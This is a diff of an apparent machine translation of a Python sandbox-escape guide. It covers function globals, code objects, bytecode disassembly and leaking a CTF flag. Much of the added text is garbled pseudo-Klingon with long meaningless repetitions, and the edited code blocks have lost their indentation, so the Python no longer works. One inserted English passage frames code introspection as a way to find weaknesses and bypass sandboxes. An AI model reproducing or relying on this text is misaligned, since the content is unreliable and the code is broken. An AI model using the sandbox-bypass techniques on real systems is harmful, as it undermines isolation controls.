'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay'
 ```python
 dir() #General dir() to find what we have loaded
 ['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
 dir(get_flag) #Get info tof the function
 ['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
 ```
+#### qawHaq
 
-#### globals
-
-`__globals__` and `func_globals`(Same) Obtains the global environment. In the example you can see some imported modules, some global variables and their content declared:
-
+`__qawHaq__` and `func_qawHaq`(cha'logh) jImej. vaj 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhut
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -869,13 +963,11 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
+[**Qa'vIn 'ej ponglIj ghom 'ej**](./#globals-and-locals)
 
-[**See here more places to obtain globals**](./#globals-and-locals)
+### **QapHa' tlhIngan Hol**
 
-### **Accessing the function code**
-
-**`__code__`** and `func_code`: You can **access** this **attribute** of the function to **obtain the code object** of the function.
-
+**`__code__`** 'ej `func_code`: **QapHa'** vItlhutlh **'ej** **ghom code object** vItlhutlh **function**.
 ```python
 # In our current example
 get_flag.__code__
@@ -889,16 +981,33 @@ compile("print(5)", "", "single")
 dir(get_flag.__code__)
 ['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
 ```
+### ghItlhvam Daq Code Information
 
-### Getting Code Information
+To bypass Python sandboxes, it is crucial to gather information about the code being executed. This information can help in identifying vulnerabilities and finding ways to exploit them. Here are some techniques to obtain code information:
 
+#### 1. Reading the Source Code
+One of the simplest ways to gather code information is by reading the source code directly. This can be done by accessing the code files or by using built-in functions like `open()` to read the contents of a file.
+
+#### 2. Decompiling Bytecode
+Python bytecode can be decompiled to obtain a higher-level representation of the code. Tools like `uncompyle6` can be used to decompile `.pyc` files and extract the original source code.
+
+#### 3. Inspecting Objects and Modules
+Python provides various functions and modules that allow inspection of objects and modules at runtime. Functions like `dir()` and `vars()` can be used to explore the attributes and methods of an object. The `inspect` module provides additional functionalities for code introspection.
+
+#### 4. Debugging and Tracing
+Using debugging and tracing techniques can provide valuable insights into the code execution flow. Tools like `pdb` (Python Debugger) can be used to step through the code, set breakpoints, and examine variables at runtime.
+
+#### 5. Dynamic Analysis
+Dynamic analysis involves running the code and observing its behavior in real-time. This can be done by using tools like `strace` or `ltrace` to trace system calls and library calls made by the code.
+
+By gathering code information through these techniques, you can gain a deeper understanding of the code's functionality and identify potential weaknesses that can be exploited to bypass Python sandboxes.
 ```python
 # Another example
 s = '''
 a = 5
 b = 'text'
 def f(x):
-    return x
+return x
 f(5)
 '''
 c=compile(s, "", "exec")
@@ -937,92 +1046,84 @@ get_flag.__code__.co_freevars
 get_flag.__code__.co_code
 'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
 ```
-
-### **Disassembly a function**
-
+### **QapHa' ghom**
 ```python
 import dis
 dis.dis(get_flag)
-  2           0 LOAD_CONST               1 (1)
-              3 STORE_FAST               1 (var1)
+2           0 LOAD_CONST               1 (1)
+3 STORE_FAST               1 (var1)
 
-  3           6 LOAD_CONST               2 ('secretcode')
-              9 STORE_FAST               2 (var2)
+3           6 LOAD_CONST               2 ('secretcode')
+9 STORE_FAST               2 (var2)
 
-  4          12 LOAD_CONST               3 ('some')
-             15 LOAD_CONST               4 ('array')
-             18 BUILD_LIST               2
-             21 STORE_FAST               3 (var3)
+4          12 LOAD_CONST               3 ('some')
+15 LOAD_CONST               4 ('array')
+18 BUILD_LIST               2
+21 STORE_FAST               3 (var3)
 
-  5          24 LOAD_FAST                0 (some_input)
-             27 LOAD_FAST                2 (var2)
-             30 COMPARE_OP               2 (==)
-             33 POP_JUMP_IF_FALSE       40
+5          24 LOAD_FAST                0 (some_input)
+27 LOAD_FAST                2 (var2)
+30 COMPARE_OP               2 (==)
+33 POP_JUMP_IF_FALSE       40
 
-  6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
-             39 RETURN_VALUE        
+6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
+39 RETURN_VALUE
 
-  8     >>   40 LOAD_CONST               6 ('Nope')
-             43 RETURN_VALUE        
-             44 LOAD_CONST               0 (None)
-             47 RETURN_VALUE
+8     >>   40 LOAD_CONST               6 ('Nope')
+43 RETURN_VALUE
+44 LOAD_CONST               0 (None)
+47 RETURN_VALUE
 ```
-
-Notice that **if you cannot import `dis` in the python sandbox** you can obtain the **bytecode** of the function (`get_flag.func_code.co_code`) and **disassemble** it locally. You won't see the content of the variables being loaded (`LOAD_CONST`) but you can guess them from (`get_flag.func_code.co_consts`) because `LOAD_CONST`also tells the offset of the variable being loaded.
-
+**ghobe'** **'ej vaj 'oH python sandbox** **'ej 'oH `dis` import.** **bytecode** **function (`get_flag.func_code.co_code`)** **'ej** **disassemble** **'e' vItlhutlh.** **variables being loaded (`LOAD_CONST`)** **content won't see** **'ach** **guess** **'e'** **(get_flag.func_code.co_consts)** **because `LOAD_CONST`** **offset** **variable being loaded.**
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
-          0 LOAD_CONST          1 (1)
-          3 STORE_FAST          1 (1)
-          6 LOAD_CONST          2 (2)
-          9 STORE_FAST          2 (2)
-         12 LOAD_CONST          3 (3)
-         15 LOAD_CONST          4 (4)
-         18 BUILD_LIST          2
-         21 STORE_FAST          3 (3)
-         24 LOAD_FAST           0 (0)
-         27 LOAD_FAST           2 (2)
-         30 COMPARE_OP          2 (==)
-         33 POP_JUMP_IF_FALSE    40
-         36 LOAD_CONST          5 (5)
-         39 RETURN_VALUE   
-    >>   40 LOAD_CONST          6 (6)
-         43 RETURN_VALUE   
-         44 LOAD_CONST          0 (0)
-         47 RETURN_VALUE
+0 LOAD_CONST          1 (1)
+3 STORE_FAST          1 (1)
+6 LOAD_CONST          2 (2)
+9 STORE_FAST          2 (2)
+12 LOAD_CONST          3 (3)
+15 LOAD_CONST          4 (4)
+18 BUILD_LIST          2
+21 STORE_FAST          3 (3)
+24 LOAD_FAST           0 (0)
+27 LOAD_FAST           2 (2)
+30 COMPARE_OP          2 (==)
+33 POP_JUMP_IF_FALSE    40
+36 LOAD_CONST          5 (5)
+39 RETURN_VALUE
+>>   40 LOAD_CONST          6 (6)
+43 RETURN_VALUE
+44 LOAD_CONST          0 (0)
+47 RETURN_VALUE
 ```
+## qo'lu' Python
 
-## Compiling Python
-
-Now, let us imagine that somehow you can **dump the information about a function that you cannot execute** but you **need** to **execute** it.\
-Like in the following example, you **can access the code object** of that function, but just reading the disassemble you **don't know how to calculate the flag** (_imagine a more complex `calc_flag` function_)
-
+Hoch, jatlhqa'laHbe'chugh **ghaHtaHvIS 'e' vItlhutlh** 'ej **vItlhutlh** 'e' vItlhutlh.\
+vaj 'e' vItlhutlh **code object** 'e' vItlhutlh, 'ach **disassemble vItlhutlh** 'e' vItlhutlh **flag qatlh** (_'ej 'e' vItlhutlh 'e' vItlhutlh `calc_flag` vItlhutlh_) 'e' vItlhutlh.
 ```python
 def get_flag(some_input):
-    var1=1
-    var2="secretcode"
-    var3=["some","array"]
-    def calc_flag(flag_rot2):
-        return ''.join(chr(ord(c)-2) for c in flag_rot2)
-    if some_input == var2:
-        return calc_flag("VjkuKuVjgHnci")
-    else:
-        return "Nope"
+var1=1
+var2="secretcode"
+var3=["some","array"]
+def calc_flag(flag_rot2):
+return ''.join(chr(ord(c)-2) for c in flag_rot2)
+if some_input == var2:
+return calc_flag("VjkuKuVjgHnci")
+else:
+return "Nope"
 ```
+### tlhIngan Hol
 
-### Creating the code object
-
-First of all, we need to know **how to create and execute a code object** so we can create one to execute our function leaked:
-
+**Qapla'!** QaStaHvIS **code object** **yIlo'laH** je **'ej chel**. **'Iv** **code object** **yIlo'laH** **'ej** **leaked** **ghItlh** **function** **yIlo'laH** **code object** **yIlo'laH** **'e'** **ghItlh** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** 